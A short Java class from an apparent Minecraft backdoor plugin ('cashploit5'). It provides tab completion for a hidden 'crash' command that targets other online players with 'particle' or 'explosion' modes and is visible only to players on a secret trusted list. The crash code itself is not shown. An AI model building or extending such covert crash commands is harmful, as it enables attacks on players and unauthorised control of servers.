package de.cashploit5.command.tab;

import java.util.ArrayList;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import de.cashploit5.command.TrustCommand;
import de.cashploit5.events.tab.TabCompleter;

public class CrashTabCompleter implements TabCompleter {
	
	private List<String> tabs1 = new ArrayList<>();
	
	public CrashTabCompleter() {
		tabs1.add("particle");
		tabs1.add("explosion");
	}
	
	@Override
	public List<String> onTab(Player p, String[] args) {
		List<String> tab = new ArrayList<>();
		
		if (!TrustCommand.getTrustedPlayers().contains(p.getUniqueId().toString())) {
			return tab;
		}
		if(args.length == 1) {
			for(Player all : Bukkit.getOnlinePlayers()) {
				tab.add(all.getName().equals(p.getName()) ? null : all.getName());
			}
		}
		if (args.length == 2) {
			String start = args[1];
			for(int i = 0; i < tabs1.size(); i++) {
				if(tabs1.get(i).toLowerCase().startsWith(start.toLowerCase())) tab.add(tabs1.get(i));
			}
		}
		return tab;
	}
}
